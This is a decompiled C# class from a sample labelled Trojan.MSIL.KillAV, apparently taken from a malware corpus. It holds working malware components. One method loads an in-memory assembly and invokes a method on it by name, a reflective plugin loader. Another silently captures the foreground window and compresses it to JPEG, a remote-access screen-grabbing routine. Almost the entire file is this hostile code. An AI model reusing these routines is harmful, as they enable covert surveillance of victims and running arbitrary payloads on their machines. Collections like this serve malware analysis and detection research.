// Decompiled with JetBrains decompiler
// Type: n.C
// Assembly: yes, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83EB8C5F-168C-47FA-93FE-E25AA6C64B02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.KillAV.ao-c83dfee0b35be414b2ecb0a3b5fff41c790bb356c2774a2fc681a8981978b48b.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace n
{
  public class C
  {
    public static byte[] Plug;

    public static object inv(ref byte[] F, ref string C, ref string S, ref object P)
    {
      Assembly assembly = Assembly.Load(F);
      return assembly.GetType(C).GetMethod(S).Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(C)))), (object[]) P);
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

    public static byte[] Capture1(ref int q, ref int HWD)
    {
      if (HWD == 0)
        HWD = API.GetForegroundWindow().ToInt32();
      if (HWD == 0)
        return new MemoryStream(sc.gc(ref q)).ToArray();
      C.RECT lpRect = new C.RECT();
      C.GetWindowRect((IntPtr) HWD, ref lpRect);
      int height = checked (lpRect.bottom - lpRect.top);
      if (height < 0)
        height = 1;
      int width = checked (lpRect.right - lpRect.left);
      if (width < 0)
        width = 1;
      Bitmap bitmap = new Bitmap(width, height);
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      IntPtr hdc = graphics.GetHdc();
      C.PrintWindow((IntPtr) HWD, hdc, 0U);
      graphics.ReleaseHdc(hdc);
      graphics.Dispose();
      int num;
      switch (q)
      {
        case 0:
          num = 80;
          break;
        case 1:
          num = 70;
          break;
        case 2:
          num = 65;
          break;
        case 3:
          num = 50;
          break;
        case 4:
          num = 45;
          break;
        case 5:
          num = 40;
          break;
        case 6:
          num = 35;
          break;
        case 7:
          num = 30;
          break;
        case 8:
          num = 25;
          break;
        case 9:
          num = 20;
          break;
        case 10:
          num = 10;
          break;
      }
      EncoderParameters encoderParams = new EncoderParameters(1);
      encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long) num);
      ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
      MemoryStream memoryStream = new MemoryStream();
      IntPtr callbackData;
      bitmap.GetThumbnailImage(checked ((int) Math.Round(unchecked ((double) width / 1.4))), checked ((int) Math.Round(unchecked ((double) height / 1.4))), (Image.GetThumbnailImageAbort) null, callbackData).Save((Stream) memoryStream, encoderInfo, encoderParams);
      bitmap.Dispose();
      return memoryStream.ToArray();
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetWindowDC(IntPtr hwnd);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowRect(IntPtr hwnd, ref C.RECT lpRect);

    public struct RECT
    {
      public int left;
      public int top;
      public int right;
      public int bottom;
    }
  }
}
